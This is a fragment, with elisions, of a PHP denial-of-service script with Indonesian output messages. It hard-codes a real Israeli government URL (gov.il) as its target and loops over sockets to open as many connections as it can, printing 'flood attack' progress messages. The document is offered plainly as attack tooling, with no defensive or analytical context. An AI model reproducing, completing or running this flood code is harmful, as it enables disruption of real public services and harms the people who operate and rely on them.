...
*/
$target_url = "http://www.gov.il:80/firstgov?di=%rand%";
...
if($skip_check != 1){
	...
	if(!$socket){
		die("Gagal terhubung ke ".$target_url['host']." on port ".$target_url['port'].$lb);
	}
...
for($c=0;$c<$max_connections;$c++){ //Stay within our max_connections limit
	echo "Serangan flood [".($c+1)."] ke ".$target_url['host']."..";
	@$attack_socket = fsockopen($target_url['host'], $target_url['port'], $errno, $errstr, 3);
	if(!$attack_socket){
		echo "Gagal (".$errstr.")".$lb;
	} else {
		echo "Berhasil".$lb."Flood terkirim: |";
